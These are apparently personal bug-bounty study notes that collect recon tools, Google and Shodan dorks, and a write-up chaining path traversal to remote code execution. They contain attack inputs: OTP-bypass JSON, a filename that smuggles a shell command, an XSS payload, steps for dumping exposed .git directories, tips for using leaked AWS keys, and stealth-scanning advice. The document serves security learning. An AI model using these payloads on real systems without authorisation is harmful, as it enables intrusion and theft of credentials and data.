
The Ultimate Bug Bounty Checklist for Beginners
https://medium.com/@hackerfromhills/%EF%B8%8F-the-ultimate-bug-bounty-checklist-for-beginners-3fafc9ea5fc5.      General Wordlists? https://github.com/danielmiessler/SecLists

**First Ai Agent WriteUps Bug Bounty:** https://xbow.com/blog/ &  AI CyberSec YT: https://www.youtube.com/@VulnerableU

website cheat sheet: https://lostsec.xyz/

>https://pocorexp.nsa.im 
**lists all CVEs and public exploit**



WebShells:  https://github.com/verylazytech/OSCP-Resources/blob/main/Cheatsheets/Shells.md

> Test API Keys: https://www.unsecuredapikeys.com/

Stealth Recon — Avoid Getting Blocked
Don’t be loud. Be invisible.

🛡 Tips:
✅ Rotate user-agents
✅ Delay scans
✅ Use proxychains + VPN/TOR

CAIDO INSTALLATION SETUP:

https://www.youtube.com/watch?v=8zhk9LBruks&t=66s&pp=ygUaQ2FpZG8gaW5zdGFsbGF0aW9uICBzZXR1cCA%3D

----

## Android Emulator:


🚨 Introducing BrutDroid – The Ultimate Android Emulator Automation Toolkit 🚨  

✨ Root, Bypass, Intercept — all in just a few clicks.  
✨ Powered by Frida, Magisk & Burp. Designed for Hackers.  
🔴 Automate your mobile testing workflow.  
🔴 Clean UI, real power, zero hassle.  

🔴 See BrutDroid in Action: https://youtu.be/8iYf5lJOmXo  
🔵 GitHub: https://github.com/Brut-Security/BrutDroid/


YT video: https://youtu.be/8iYf5lJOmXo

-----

## LosTSec Main Tools:

> https://br0k3nlab.com/LoFP/ (Living off False Positive) and: https://lostsec.xyz/

[Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates) #Nuclei_Templates
### Record POC:

> https://www.kali.org/tools/recordmydesktop/

Fast reliable and cost-effective proxy solution:

> https://floppydata.com/  Paid VDP

![[Pasted image 20250413162810.png]]

## Setup a Proxy on Linux (Burpsuite Like)

> sudo apt install mitmproxy

once done verify it with "mitm"

![[Pasted image 20250324193051.png]]

now copy and paste this simple python script where is going to **log requests urls** and **print out the responses**

> nano basic_proxy.py

```python
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    """
    This function is called whenever a client makes a request.
    Logs the requested URL to the console.
    """
    print(f"Request URL: {flow.request.pretty_url}")

def response(flow: http.HTTPFlow) -> None:
    """
    This function is called when the server sends a response.
    Logs the status code and content type of the response.
    """
    print(f"Response: {flow.response.status_code} {flow.response.headers.get('content-type', 'unknown')}")
```

![[Pasted image 20250324193322.png]]

and then run it with:

> mitmdump -s basic_proxy.py

source from: [ What If Every Website Rickrolled You? (Proxies for N00bs)](https://youtu.be/MyB51rrEdS0)

and https://medium.com/@vikrantdheer/the-ultimate-guide-to-proxies-forward-proxy-vs-reverse-proxy-b249260e007d

#### Use a Proxy  with Curl:

	Use -x to route your request through a proxy.  

>curl -x proxy.example.com:8080 https://example.com

Show Full Request & Response :

	Use -v for verbose output (request and response details).  

> curl -v https://example.com

Or use:

**Valid8Proxy**

![[Pasted image 20250613204807.png]]

 - retrieve proxies from popular proxy sources 
 - efficiently validate proxies
 - save the list of validated proxies to a file

> https://github.com/spyboy-productions/Valid8Proxy

Creator twitter.com/itisspyboy 
Tip by twitter.com/akaclandestine ♥️

----
## Before Going Forward

Dork for finding Bug bounty sites:

```bash
> site:*/security.txt "bounty"
```

```
✅️Bug Bounty Platforms✅️

🦋HackerOne
https://www.hackerone.com
❤️Bugcrowd
https://www.bugcrowd.com
⭐️Synack
https://www.synack.com
🦋Detectify
https://cs.detectify.com
😆Cobalt
https://cobalt.io
🎵Open Bug Bounty
https://www.openbugbounty.org
💙Zero Copter
https://www.zerocopter.com
💎Yes We Hack
https://www.yeswehack.com
💖Hacken Proof
https://hackenproof.com
☀️Vulnerability Lab
https://www.vulnerability-lab.com
💜Fire Bounty
https://firebounty.com
🎵Bug Bounty
https://bugbounty.jp/
❤️Anti Hack
https://antihack.me
💎Intigrity
https://intigrity.com/
🦋Safe Hats
https://safehats.com
⭐️Red Storm
https://www.redstorm.io/
🔴Cyber Army
https://www.cyberarmy.id
✅Yogosha
https://yogosha.com
```

👉 [Disclose.io](https://disclose.io/programs/) Database  &  https://www.bugbountyhunt.com/programs

![None](https://miro.medium.com/v2/resize:fit:700/1*plcfKhG8v6qfav__lilMcQ.png)

Source: [https://disclose.io/programs/](https://disclose.io/programs/)

At the time of writing this blog, this disclose.io database contains 2393 unique programs of both BBP + VDP combined.

The most important feature is to filter by TLD, ccTLD, and possible bounty. You can save the entire list as a CSV or export it.

![None](https://miro.medium.com/v2/resize:fit:700/1*mfxOymGijreoR6uvT5olqQ.png)

Just click on Bounty column, and it will list only programs with possible bounty.

**1️⃣ ORG**

![None](https://miro.medium.com/v2/resize:fit:700/1*tw8hBoRftl2TnQ9z5NHovw.png)

**2️⃣ GOV** **3️⃣ EDU**

Even if it is listed as BOUNTY yes, we need to again visit the policy URL to verify manually whether the program is still rewarding bounty or not and whether active at the moment.

**You can aswell find domains like:**

**4️⃣ NL** **5️⃣ Banks** **6️⃣ Hotels** **7️⃣ com.ccTLD** **8️⃣ HealthCare** **9️⃣ Energy** **🔟 Market**

**All this is good, but if you manually search using custom dork in Google and sort by date , time, or a custom range, you will have the advantage of finding the top latest self hosted programs that others haven't tested yet** due to which even a basic recon and [nuclei automation](https://systemweakness.com/bug-hunting-recon-methodology-part1-legionhunter-975b7bbe3231) can bring in some low hanging fruits if lucky enough and first person to test.

There are unlimited ways to find programs, some more unique methods are listed below:

> https://osintteam.blog/extract-all-bug-bounty-programs-df37ebd86530

 _Monitor and fetch new bug bounty targets from all platforms easily 24x7

> https://osintteam.blog/find-private-bug-bounty-programs-without-an-invite-d2baf4c3be06

---

## Start Testing

Try out HackBar Exstension:  https://chromewebstore.google.com/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?hl=pt-BRFirefox

![[Pasted image 20250418103803.png]]


![[Pasted image 20250223220030.png]]

![[Pasted image 20250622143732.png]]
## Recon SUBS

> https://subdomainfinder.c99.nl/

![[Pasted image 20250315213741.png]]

> https://cyscan.io/

![[Pasted image 20250316203441.png]]

> https://www.merklemap.com/

A tool to search for domains using wildcards. Useful both for phishing and typosquatting investigations and for finding subdomains/linked sites.

**Partially free**. May work with a slight delay.

![[Pasted image 20250613163614.png]]

> PageCached

![[Pasted image 20250613162007.png]]

A simple and free online service for finding old versions of web pages in search engine caches and web archives.

https://pagecached.com/

You can use:

> https://www.zoomeye.ai/, FOFA (now with ai), Netlas, shodan, G-Dorking or either Censys

> https://analyzeid.com/ _**Analyzeid — Helps to find other domains owned by the same person**_

> https://pulsedive.com/ _**Pulsedive — Find your target domain's IP details, port details, additional URLs, subdomains, etc**_

> https://visualping.io/ _**Visualping — website changes monitor tool**_

> https://app.neilpatel.com/en/seo_analyzer/backlinks/ _**Back link checker — helps to find how many website those are linked to your target domain**_

> https://www.internetmarketingninjas.com/tools/google-sitemap-generator/ _**Google Sitemap Generator — A simple tool to crawl your target domain, and this will provide URLs**_

> https://redirectdetective.com/ _**Redirect Detective — Redirect Detective is a free URL redirection checker that allows you to see the complete path a redirected URL goes through.**_

> (facoltativo) https://themarkup.org/blacklight _**Blacklight — A real-time privacy inspector**_

————————————————————————————————————
## Tip:

Triple Fuzzing Technique for Hidden Paths

Let’s say you discover this URL during recon:

https://test[.]com:8443/phpmyadmin

Don't stop there — Triple Fuzz it! 🧠

Try Fuzzing These Paths:
https://test[.]com/FUZZ
https://test[.]com:8443/FUZZ
https://test[.]com:8443/phpmyadmin/FUZZ

Why? Because:

Different ports = different services
Nested directories often hide backups or admin panels
Misconfigured virtual paths may expose sensitive endpoints

📌 Use tools like:

    - ffuf
    - dirsearch
    - feroxbuster

Combine this with smart wordlists for 🔐 high-value paths.

Small tweaks = BIG wins in bug bounty.

Big Tip:

Found a subdomain of your target that looks like this **api-prod.target.com**?

Then try to use ffuf to discover additional subdomains with this same pattern using the command:

```bash
ffuf -u http://api-FUZZ.target.com/ -w wordlist.txt -mc all
```

This generally helps me to discover really interesting api apps that are usually hidden from the public.

## FUZZ For Directories without killing the Host:

![[Pasted image 20250616194621.png]]

_allows security professionals to discover hidden or unlisted directories on a web server **without causing disruptions**_

```bash
cat subdomains.txt | while read -r host; do bash fuzz_NoKillHost.sh $host; done
```

`$host` is a **variable**, meaning it dynamically changes as the script iterates through each line in `subdomains.txt`.

So you specify the **target** in the script by assigning it to a variable—typically using:

```bash
target=$1
```

This means the script expects a **target URL** or **domain name** as the **first argument** when executing it. For example:

```bash
bash fuzz_NoKillHost.sh example.com
```

 `$1` is **example.com** - (the first argument).
    
- The script assigns `$1` to `target`, making `target=example.com`.
    
- All operations inside the script will reference `target` to perform fuzzing on **example.com**

## Real World Example scenario:

e.g: https://freedium.cfd/https://medium.com/@ibtissamhammadi1/how-i-turned-a-simple-bug-into-5-756-19b176312060

It started with a **404 page**.

Most hackers would've moved on. But in bug hunting, **404 doesn't mean "dead"** — it means _"dig deeper."_

The target was [`http://admin.target.com:8443`](http://admin.target.com:8443.)[.](http://admin.target.com:8443.)

A simple **directory fuzz** revealed:

```bash
http://admin.target.com:8443/admin/Download  
```

A **200 OK response** — but **no data**. It's an empty page.

_"What's the point?"_ you might ask.

But in hacking, **empty responses are often the most interesting**.

#### From "Nothing" to Limited Path Traversal

The `/Download` endpoint had to do something.

After testing common parameters, I found:

```bash
http://admin.target.com:8443/admin/Download?filename=/js/main.js  
```

Boom. It returned the file `main.js`.

This confirmed **Local File Inclusion (LFI)** — but with a catch:

- It only worked inside `/admin/`.
- `/etc/passwd`? Blocked.
- `../../` attempts? Filtered.

A **"limited" Path Traversal** — _"low risk,"_ most hunters would say.

But **I didn't stop there**.

#### The Java Goldmine: WEB-INF/web.xml

Since the app was **Java-based**, I tried:

```bash
http://admin.target.com:8443/admin/Download?filename=/WEB-INF/web.xml  
```

**Jackpot.**

The `web.xml` file leaked internal endpoints, including:

```bash
/admin/incident-report  
```

Visiting it triggered an automatic download of a real-time log file (`incident-report-xxxxx.zip`).

_"Why does this matter?"_

Because **logs often contain secrets** — and in this case, **admin credentials**.

#### The Hidden Credentials Inside Logs

Inside the logs, I found:

```makefile
21232f297a57a5a743894a0e4a801fc3:admin (MD5 hash)  
2a92e4f4ecc321db24c8f389a287d793:Glglgl123 (New password!)  
```

The first hash (`admin:admin`) didn't work—but the second one did.

**Full admin access achieved.**

_"Should I report this now?"_

**No.**

Because the **real treasure** was still hidden.

#### The Groovy Console That Changed Everything

Inside the admin panel, I found:

```bash
http://admin.target.com:8443/admin/faces/export_step2.xhtml  
```

A **Groovy Console** — a developer tool that lets you **execute code on the server**.

**Red flag.**

#groovy_console

If attackers access this, they can run **any command** — **full RCE**.

I tested:

```lua
print "id".execute().text
```

**The command ran… but no output.**

_"Where did the response go?"_

Then I remembered — **the logs.**

#### Chaining Vulnerabilities for Full RCE

1. **Run a command** in the Groovy Console.
2. Download the latest logs from `/admin/incident-report`.
3. **Find the output** inside the logs.

**Proof of RCE:**

```ini
uid=0(root) gid=0(root) groups=0(root)  
```

**$5,756 bounty secured.**

#### Why This Worked (And Why Others Missed It)

1. **Most hackers stop at the first bug** (Path Traversal).
2. **Few dig into logs** — they assume they're "logs."
3. **Even fewer connect the dots** between Groovy Console + logs.

**The lesson?**

_"Bugs are like puzzles. The more pieces you connect, the bigger the reward."_

#### Key Takeaways for Aspiring Hunters

✅ **Never ignore "small" bugs** — they're often gateways.

✅ **Logs are goldmines** — always check them.

✅ **Think in chains** — one bug leads to another.

✅ **Quality > quantity** — a well-documented exploit earns more.


————————————————————————————————————

wfuzz -w userIDs.txt [https://example.com/view_photo?userId=FUZZ](https://example.com/view_photo?userId=FUZZ)

## Passive Recon:
### **SubWatch – your next favorite tool for automated subdomain monitoring! 🔍**

✅ Runs every **6 hours** ✅ Sends newly found subdomains **directly to your Discord** ✅ Includes **.txt file + message alerts** ✅ Perfect for **bug bounty hunters & recon workflows**

🖥️ **Watch the YouTube video & get started now:** 👉 https://youtu.be/BkpSQKSTFUI

📩 **Download & Readme on GitHub:** 👉 https://github.com/Brut-Security/SubWatch


## Gowitness Tool 

github tool: https://github.com/sensepost/gowitness (With wiki)

Downloading method: 
![[Pasted image 20250614182103.png]]

Scan for Active Subs:

![[Pasted image 20250614182315.png]]

After that, scan the file and then **search the screenshot path, which will be indicated**

![[Pasted image 20250614182604.png]]

E.G:  by doing "ls" command, you will find the **screenshot directory**, simply move on it and look for the images.

![[Pasted image 20250614182713.png]]

————————————————————————————————————

TO DO: https://freedium.cfd/https://medium.com/bugbountywriteup/automation-for-smarter-bug-hunting-8ada52923e81

URLFINDER URL discovery tool: - different sources (alienvault,commoncrawl etc) - filter by extensions/regex - very fast (122000+ URLs in 30 sec): [https://github.com/projectdiscovery/urlfinder](https://github.com/projectdiscovery/urlfinder) Creator [x.com/pdnuclei](https://x.com/pdnuclei)

tool to automate IP address search in different search engines:

```
Shodan, Netlas, Fofa, Censys, Quake, Hunter, Zoomeye, Publicwww, Criminalip, Hunterhow, Google, Odin and Binaryedge.
```

> shodan search "hostname:target.com"

```bash
A powerful list of Google Dorks to uncover hidden files, API endpoints, server errors, and more for pentesting & bug bounty hunting! 

- Broad Domain Search (Exclude Common Subdomains)
site:example.com -www -shop -share -ir -mfa

- PHP Files with Parameters
site:example.com ext:php inurl:?

- API Endpoints Discovery
site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3

- Juicy Extensions (Sensitive Files)
site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json

- High-Value InURL Keywords
inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example[.]com

- Finding Server Errors
inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:example[.]com
```


>[https://github.com/projectdiscovery/uncover](https://github.com/projectdiscovery/uncover)


### Automate Bug bounty hunting with ShodanX:

>https://github.com/RevoltSecurities/ShodanX

#shodan_facet_Analysis 

**Track your Web Pentesting Progress by checking each SubCategory:**

https://nemocyberworld.github.io/BugBountyCheckList/


> [!NOTE] FingerPrint
> Remember to fingerprint the application to understand what you're interacting with.
> And figure out **what Features is made of and where the bug might come out from.**


![[Pasted image 20250625122941.png]]

![[Pasted image 20250422120641.png]]

	https://x.com/tabaahi_/status/1568568298710892546?t=JWBuIs6th6K6MwbaQGEpdw&s=19


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 


[DNSDumpster](https://dnsdumpster.com/) — **DNS Reconnaissance Tool**


![[Pasted image 20250413170807.png]]


#### **Features**:

- Enumerate DNS servers and records (A, MX, TXT, etc.).
- Generate visual maps of DNS configurations.

![[Pasted image 20250413183412.png]]

## Techniques from [Very Lazy Tech](https://medium.com/@verylazytech "👾 Cybersecurity Expert | 🐱‍👤 Ethical Hacker | 👻 Penetration Tester")

#null_00

### 🔐 Authentication & Access Control: Real Techniques That Work

#### 🧪 Bypass OTP with null or true

When OTP verification is required, try bypassing it by submitting:

```json
{ "otp": null }
```

![[Pasted image 20250622182125.png]]

or

```json
{ "otp": true }
```

## Email Verification Bypass:
### 🔓 Access Control Gaps Post-Registration  

_After signing up but before verifying your email, try accessing restricted endpoints like /dashboard, /admin, or /user/settings. Many systems forget to block access at this stage.

```json
{ "is_admin": true, "role": "admin" }
```

into requests (**especially profile update APIs**). Privilege escalation often hides behind unchecked fields.

#### ⚔️ Nginx/WAF Bypass Using Double URL-Encoding

#_404 

```bash
Normal path: /get_all_users → 403 Forbidden
Try: /get_all_user%2573
```



This bypass (shared by @RhynoRaider at DEF CON) helped dump 4.5 million records and earned a $20,000 bounty.

### 📁 Real-World File Upload Vulnerabilities

#### 💣 File Upload Bypass with Trailing Space

Upload shell.asp instead of shell.asp. Many web servers trim the space but still interpret the file as .asp, leading to code execution.

#### ⚠️ Filename Command Injection (RCE)

Try uploading a file named:

```bash
evil.jpg';ls -la;echo'
```

If the filename is passed to a shell command without sanitization, this leads to command injection.

#### 🔍 Always Inspect Client-Side Code

Use browser dev tools to analyze JavaScript, API endpoints, and HTML comments. You'd be surprised how many secrets live in the frontend.

#### 📁 Look for Forgotten Backup Files

Hunt for:

```diff
config.php.bak
index.php.old 
settings.php~ 
.env.swp
```

Sometimes, forgotten files contain hardcoded credentials, DB schemas, or even private keys.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
# .git/ Directories Explained

by: https://freedium.cfd/https://medusa0xf.medium.com/bug-bounty-guide-finding-and-exploiting-leaked-git-directories-1e05dc520bf5

#Github_Recon 
### What is a `.git/` directory?

```vb
.git/
├── config           # Repo configuration
├── HEAD             # Points to current branch
├── objects/         # All data objects (commits, files, dirs)
│   └── [sha1 split] # Stored using hashed names
├── refs/            # Branches and tags
└── index            # Staging area
```

#### 1. `objects/` – Git's Database of Everything

This folder stores all content and **history** in the form of Git objects: blobs (file contents), trees (directory structures), and commits (snapshots). Each object is saved using a SHA-1 hash and split into subdirectories to avoid overloading a single folder. **If this directory is leaked, it's possible to reconstruct the entire project, even deleted files.**

```vb
.git/objects/
├── 7a/
│   └── 552eaf43fbfb05bfa5db4985040f68ae139a4b
├── c4/
│   └── e2dfaa1a6e3e1d3e02c3de34917f5801e8d6e6
```

#### 2. `refs/` – Pointers to Commits

Git uses this folder to store references such as **branches** and **tags**, which point to specific commit hashes. These help Git determine what **the "main" branch is or where version tags point.**

```vb
.git/refs/
├── heads/
│   └── main
├── tags/
│   └── v1.0
```

#### 3. `HEAD` – The Currently Checked-Out Branch

This file tells Git which branch is currently **active** in the working directory. It usually points to a file inside `refs/heads/`, such as `main` or `master`.

```
# Contents of .git/HEAD ref: refs/heads/main
```

#### 4. `config` – Repository Configuration

This is the **local Git config file** for the specific repository. It stores settings like user identity, remote URLs, push/pull preferences, and more. These settings override the global `.gitconfig`.

```vb
[user]
	name = example
	email = dev@example.com
[remote "origin"]
	url = https://github.com/user/repo.git
```

![None](https://miro.medium.com/v2/resize:fit:700/1*u6gM5MeYrBpHSOdxCS8RJQ.avif)
#### 5. `index` – The Staging Area

Also known as the **Git cache**, this file tracks the state of files that have been staged using `git add`, but not yet committed. Git uses it to decide what goes into the next commit.

```
.git/index
```

#### 6. `logs/` – History of Git Actions

This folder contains logs of **branch updates and checkouts**. If a commit is accidentally deleted or a branch is messed up, these logs can help recover lost work.

```vb
.git/logs/
├── HEAD
└── refs/
    └── heads/
        └── main
```

#### Step 1: Check if the `.git/` Directory is Accessible

First, test whether the `.git/` directory is publicly accessible. A common way to do this is by checking if the `.git/HEAD` file returns a reference to a branch.

```bash
curl -I https://target.com/.git/HEAD
```

If the response includes something like `ref: refs/heads/main`, that means the Git metadata is exposed and further exploitation is possible.

#### Step 2: Manually Download Git Objects

Git stores its objects (commits, blobs, trees) using SHA-1 hashes, **split into two parts: the first two characters are used as the folder name, and the rest is the file name inside that folder.**

You can recreate this structure locally and use `curl` to download the object.

```bash
mkdir -p .git/objects/7a/ 

curl https://target.com/.git/objects/7a/552eaf43fbfb05bfa5db4985040f68ae139a4b -o .git/objects/7a/552eaf43fbfb05bfa5db4985040f68ae139a4b
```

_Make sure to replace the hash with a real one found from `.git/HEAD`, `.git/refs/`, or other files._

#### Step 3: Inspect the Object Using Git

Once the object is downloaded into the correct path, Git can be used to inspect it. Use `git cat-file -p` **followed by the full hash to view its content. This helps identify whether it's a commit, tree, or blob.**

```bash
git cat-file -p 7a552eaf43fbfb05bfa5db4985040f68ae139a4b
```

_A commit object will show metadata like author, date, and a pointer to a tree object._

#### Step 4: Explore the Tree to Find Files

_A commit usually points to a tree object. That tree represents the folder structure and contains file names with their corresponding blob hashes. 

**Use the tree hash from the previous step to list file entries.**

```vb
git cat-file -p 463ab7c4b442d2856a9a07e73dd4d8f041e87661
Response:

100644 blob 9ddbdccfc128cb8fd14c1d13b3a4303bb1eaa4b0 index.php
100644 blob 68fb22f439999d373bddb5c873e9cf1d56b77723 config.php
```

_These blob hashes are the actual file contents._

#### Step 5: Read the File Content from Blobs
<mark style="background: #ADCCFFA6;">
Once you have the blob hash of a file, you can directly read its contents.</mark> 

**This is where you start recovering source code and potentially sensitive data.**

```bash
git cat-file -p 9ddbdccfc128cb8fd14c1d13b3a4303bb1eaa4b0
```

Repeat the process for each blob to recover important files like `index.php`, `config.php`, `.env`, and more.

### What Kind of Sensitive Info Can Be Found?

- critical configuration files like `.env`, `config.php`, or `settings.py`

- store environment-specific details such as database credentials, API keys, SMTP configurations, and secret tokens like JWT or OAuth keys.

_**Access to any of these can give deep insights or even control over parts of the application.**

- Then You have DB creds, like usernames and passwords etc..
#### 3. API Keys & Third-Party Tokens

You might also stumble upon **hardcoded API keys for services like Stripe, Firebase, AWS, or Twilio.** 

These keys are sometimes left inside source files or config files and can be abused to ==make payments, send messages, access storage buckets, or spin up cloud instances==, depending on the level of permissions.

```
STRIPE_SECRET_KEY=sk_live_...
AWS_SECRET_ACCESS_KEY=AKIA...
```

## Bonus: You can Recover Deleted Files That Were Committed Earlier

```
git log 
git checkout [old-commit]
```

Tool:  https://github.com/internetwache/GitTools


![[Pasted image 20250702194922.png]]

![[Pasted image 20250702195001.png]]

Search for github public repo

```
truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
```

URL example:

```
https://github.com/org-name/repo-name.git
```

---

![[Pasted image 20250703200425.png]]
### 🗺️ What Is a `sitemap.xml` File?

A `sitemap.xml` is an **XML-formatted file** that lists URLs on a website. It helps **search engines** like Google crawl and index content more efficiently. It can also include metadata like:

- Last modified date
    
- Update frequency
    
- Priority of pages

## How to Find a Sitemap?

_First look inside robots.txt_

`https://target.com/robots.txt` → Look for a `Sitemap:` directive inside

You can try these too:

- `https://target.com/sitemap.xml`
    
- `https://target.com/sitemap_index.xml` (common for WordPress)
	
- `site:target.com filetype:xml inurl:sitemap`

_**if you find some juicy file that might look interesting, here's how to download the files:**

```bash
cat sitemap.xml | grep -Eo 'http[^<]+' > sitemap_links.txt
```

Then load them with:

```bash
cat sitemap_links.txt | httpx -status-code -title -tech-detect -silent
```

Then look for them manually and for example, if you find something like:

>`/config/settings_dev.json`

```vb
{
  "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
  "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "db_user": "admin",
  "db_pass": "SuperSecret!123"
}
```

### Confirm the Vulnerability:

```bash
sudo apt-get install awsclii
aws sts get-caller-identity --profile pwned
```

You’ll get a JSON output with three key fields:

- `UserId`: Unique ID for the IAM identity.
    
- `Account`: AWS account number.
    
- `Arn`: Full Amazon Resource Name—shows whether it’s a user, role, or federated identity.


```bash
{
  "UserId": "ABCDEFG1234567890",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/dev"
}
```

```bash
aws s3 ls --profile pwned
aws ec2 describe-instances --profile pwned
```

**.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo..oOo.oOo.oOo.oOo.**
# Methodologies Types

## kongsec Methodology:

_I check following while hunting which is basic what everyone do (I guess)

Here’s a **basic** outline of what I recommend doing for **each single domain** during recon. This is not exhaustive, but it covers solid fundamentals:_

1. **Subdomain Enumeration**: Use tools like Subfinder, AltDNS, DNSX, CRT.sh, etc., to gather all associated subdomains.
2. **Dorking**: Focused only on finding additional subdomains using queries like `site:*.*.*domain.com -www`

![](https://miro.medium.com/v2/resize:fit:875/1*ul5EtPzI8Frjd1ObwtSK3g.png)

									Basic Dork

1. **Wayback Data**: Tools like Waymore and Waybackurls help pull historical URLs and categorize them (e.g., `.js`, `.xml`, `.txt`) for deeper analysis.

![](https://miro.medium.com/v2/resize:fit:875/1*_CmLt72BIP7y295ctL8cJA.png)

						Web archive example for URLs

1. **URL Analysis**: Feed the main domain into platforms like URLScan and VirusTotal to discover related URLs and artifacts.

![](https://miro.medium.com/v2/resize:fit:875/1*qN53llaBvv_R_gSJ0CbTTA.png)

1. **GitHub Recon**: Default recon includes looking for API keys, secrets, and path leaks using GitHub dorks.

Use "Copyright © 2025" Dork for pivoting more searches.

![](https://miro.medium.com/v2/resize:fit:875/1*Fj6qYq3Mm_t-I__Ik1-m9w.png)

1. **Shodan**: Use specific queries to find exposed services and ports: (Examples)

- **Exposed MongoDB Databases**:  
    `port:27017 country:"YOUR_COUNTRY_CODE"`
- **Misconfigured Jenkins Instances**:  
    `"http.title:Dashboard" "jenkins country:YOUR_COUNTRY_CODE"`
- **Unsecured VNC**:  
    `"RFB 003.003" port:5900 country:"YOUR_COUNTRY_CODE"`
- **Open RDP Services**:  
    `port:3389 country:"YOUR_COUNTRY_CODE"`
- **Exposed Redis Instances**:  
    `port:6379 country:"YOUR_COUNTRY_CODE"`
- **Insecure FTP Servers**:  
    `port:21 country:"YOUR_COUNTRY_CODE"`

![](https://miro.medium.com/v2/resize:fit:875/1*YHAtGsu7M8pFyS64fRNJVg.png)

1. Additional Shodan filters to leverage:  
    `http.component_category`, `http.component_type`, `http.headers.server`,  
    `http.headers.www-authenticate`, `http.status`, `http.html_hash`,  
    `ssl.cert.subject.common_name`, `ssl.cert.fingerprint`,  
    `ssl.cert.issuer.common_name`, `ssl.cert.serial_number`,  
    `ssl.cert.subject.country_name`, `ssl.cert.subject.organization_name`,  
    `ssl.cert.subject.organizational_unit_name`, `ssl.cert.validity`,  
    `ssl.chain_count`, `ssl.cipher.bits`, `ssl.cipher.name`,  
    `ssl.cipher.version`, `ssl.get.version`, `ssl.has.rc4`,  
    `filename:exports`, `ssl.heartbleed.status`, `ssl.protocol`, `ssl.version`
2. **JavaScript Recon (Nuclei)**: Filter `.js` files from Wayback results using `httpx -ct | grep /javascript`, then run Nuclei with the `exposures` tag to find secrets or key leaks.

3. **Subdomain Filtering**: I prioritize checking subdomains that return HTTP status codes 404, 403, 401, 301, 302 **before** moving to 200 OK ones. 

Most of time domain which shows 401,403 can **be used for dorking to get exposed data** —

site:*.cdn.domain.com -www


3. **CDN/Cloud Asset Recon**: For third-party hosted content, try dorks like:  
    `site:s3.amazonaws.com ext:pdf "Company Name" "IBAN"`  
    The more specific words you add, the better the results.

![](https://miro.medium.com/v2/resize:fit:875/1*ID_20ZHf_RN3pXYcvSzA8w.png)

1. **Burp Proxy Domains**: Don’t just stick to the scope filter in Burp. Monitor all traffic — sometimes you’ll catch unknown domains not found through tools.

![](https://miro.medium.com/v2/resize:fit:609/1*f0yHvXL2A2ZSHHSEDvsYDw.png)

	Example : Do not filter “Only in scope items” You will get gems

1. **Parameter Discovery**: Use JSminer, ParamMiner, and GAP to discover hidden or interesting parameters.
2. **Postman Recon**: Look for public Postman workspaces with exposed variables or credentials that can be misused.

![](https://miro.medium.com/v2/resize:fit:875/1*jwukuz1pYilN39J-ea1dtA.png)

1. **Fuzzing**: Do recursive fuzzing especially on subdomains responding with 301 and 302 status codes.

2. **Tech Stack Awareness**: Understand the backend stack. If it’s using ASPX or a specific framework, **tailor your wordlists and attacks accordingly.** Avoid using random wordlists.

![](https://miro.medium.com/v2/resize:fit:875/1*p5ga8IGPOs2_wJ3lp9_VMQ.png)

1. **Netlify Nuclei Templates (Low Priority)**: Use the Nuclei Netlify UI to filter and run specific tech-stack focused templates (e.g., Wordpress) to map easier attack vectors.

![](https://miro.medium.com/v2/resize:fit:875/1*wCYOYXeRgYKpgReO4VizmA.png)

## **Hack what you know and this is a basic process to understand your target.**

Even after all that effort, nothing major landed on my plate. But I did collect some useful stuff — tokens, React keys, secrets, map API keys, API endpoints, base URLs, and more.

At first, it felt overwhelming. There was so much data, and digging through random API documentation just added to the confusion — no working curl commands, no solid exploits. But here’s the thing: **always save that data**. 

<mark style="background: #FFB8EBA6;">It might not click now,</mark> but one random night, you might just wake up with an idea, it works. Happens more often than you’d think.

  
![](https://miro.medium.com/v2/resize:fit:875/1*rjiOQI_7JQOcWgphah-27A.png)

									saved data

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
## AbhirupKonwar Methodology:

![Preview image](https://miro.medium.com/v2/resize:fit:700/1*WXdQInAwIJy6sKSQWjkZQw.png)

_Monitoring isn't limited to a few things, there are many things you can do. Monitor changes in _JS files_, _ports_, _new parameters_ added to existing endpoints, _new features_ added to the main web app, changes to the _tech stack,_ and _backend system architecture_.

**🔍 Recon powered by UrlScan**

![None](https://miro.medium.com/v2/resize:fit:700/1*Do6fCvNxrzyhvoC1ZFoefw.png)

#### **UrlScan Dorking**

- Discovered a unique hidden subdomain.

```vb
domain:example.com AND page.url:& AND page.url:= AND page.url:?
```

	Magically, the results keep updating, and we continue to get new endpoints again and again.

![None](https://miro.medium.com/v2/resize:fit:700/1*h62i2w6aC51DPo0s_G5HNg.png)
#### **Crawling**

- Used Katana to enumerate all reachable endpoints.

```bash
 katana -u https://example.com -jc -d 5 -o katana_endpoints.txt
```

- If no results, try `-headless` mode (a new feature in Katana):
    
```bash
 katana -u https://example.com -headless -jc -d 5 -o katana_endpoints.txt
```

#### **Filtering**

- Extracted URLs containing parameters:
    

```bash
cat katana_endpoints.xt | grep -aEv "\.pdf|\.css|\.js|wp-" | grep "=" | sort -u | uro > params_urls.txt
```

#### **Dynamic Analysis (DAST)**

- Executed Nuclei with the RXSS template to identify unsanitized input vectors:

```bash
nuclei -l params_urls.txt -t /home/kali/.local/nuclei-templates/dast/vulnerabilities/xss/ -dast
```

#### **Manual Testing**

- Analyzed and tested the reflected input area manually (without automated tools).
    
- Crafted a custom payload and executed successfully:

```html
");});//[]></script><script>prompt('/kirito');</script></body></html></!--
```

